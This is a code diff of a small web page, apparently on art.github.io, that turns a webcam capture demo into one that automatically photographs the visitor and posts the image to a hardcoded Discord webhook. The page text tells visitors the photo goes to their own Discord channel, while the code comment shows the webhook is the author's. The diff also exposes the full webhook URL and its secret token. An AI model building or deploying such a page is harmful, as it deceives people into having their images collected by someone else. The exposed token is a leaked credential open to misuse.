@@ -2,7 +2,7 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8">
-  <title>Camera Auto Capture - art.github.io</title>
+  <title>Camera Capture to Discord - art.github.io</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -25,9 +25,6 @@
       font-weight: 600;
       margin-top: 40px;
     }
-    a#captureLink:hover {
-      opacity: 0.9;
-    }
     video, canvas, img {
       margin-top: 20px;
       border-radius: 12px;
@@ -45,20 +42,23 @@
 </head>
 <body>
 
-  <h1>Auto Camera Capture Test</h1>
+  <h1>Send Camera Capture to Discord</h1>
   <p class="note">
-    กดลิงก์ด้านล่าง → เบราว์เซอร์จะขออนุญาตใช้กล้อง<br>
-    พอกด Allow แล้วระบบจะถ่ายรูปอัตโนมัติ 1 รูป + ดาวน์โหลดลงเครื่อง
+    กดปุ่มด้านล่าง → กล้องจะเปิด → ถ่ายรูปอัตโนมัติ<br>
+    และส่งรูปไปที่ Discord channel ของคุณทันที
   </p>
 
-  <a href="#" id="captureLink">กดเพื่อเริ่มใช้กล้องและถ่ายอัตโนมัติ</a>
+  <a href="#" id="captureLink">เริ่มถ่ายแล้วส่งรูป</a>
 
   <video id="video" playsinline autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <img id="photo" alt="รูปที่ถ่ายจะโชว์ตรงนี้">
+  <img id="photo" alt="preview">
   <p class="note" id="status"></p>
 
   <script>
+    // ใช้ Webhook URL ของอาร์ตตรงนี้
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";
+
     const captureLink = document.getElementById('captureLink');
     const video       = document.getElementById('video');
     const canvas      = document.getElementById('canvas');
@@ -66,8 +66,7 @@
     const statusText  = document.getElementById('status');
 
     async function startCapture() {
-      statusText.textContent = "กำลังขออนุญาตใช้กล้อง...";
-
+      statusText.textContent = "กำลังเปิดกล้อง...";
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
@@ -83,12 +82,12 @@
 
         statusText.textContent = "กำลังถ่ายรูป...";
 
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(r => setTimeout(r, 800));
 
         const width  = video.videoWidth;
         const height = video.videoHeight;
 
-        canvas.width  = width;
+        canvas.width = width;
         canvas.height = height;
 
         const ctx = canvas.getContext('2d');
@@ -97,25 +96,37 @@
         const dataURL = canvas.toDataURL('image/png');
         photo.src = dataURL;
 
-        // ⭐ ดาวน์โหลดลงเครื่องอัตโนมัติ
-        const a = document.createElement('a');
-        a.href = dataURL;
-        a.download = 'capture-' + Date.now() + '.png';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        // แปลงเป็น Blob
+        const blob = await (await fetch(dataURL)).blob();
+        const filename = "capture-" + Date.now() + ".png";
 
-        statusText.textContent = "ถ่ายรูป + ดาวน์โหลดเรียบร้อยแล้ว ✅";
+        const form = new FormData();
+        form.append("file", blob, filename);
+        form.append("content", "📸 Photo captured from art.github.io");
 
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = 'none';
+        statusText.textContent = "กำลังส่งรูปไป Discord...";
+
+        const res = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          body: form
+        });
+
+        if (res.ok) {
+          statusText.textContent = "ส่งรูปสำเร็จ! ไปดูใน Discord ได้เลย ✅";
+        } else {
+          statusText.textContent = "ส่งรูปไม่สำเร็จ ❌ Error: " + res.status;
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        video.style.display = "none";
+
       } catch (err) {
         console.error(err);
-        statusText.textContent = "ใช้กล้องไม่ได้หรือผู้ใช้ปฏิเสธ ❌";
+        statusText.textContent = "เปิดกล้องไม่ได้หรือถูกปฏิเสธ ❌";
       }
     }
 
-    captureLink.addEventListener('click', (e) => {
+    captureLink.addEventListener('click', e => {
       e.preventDefault();
       startCapture();
     });
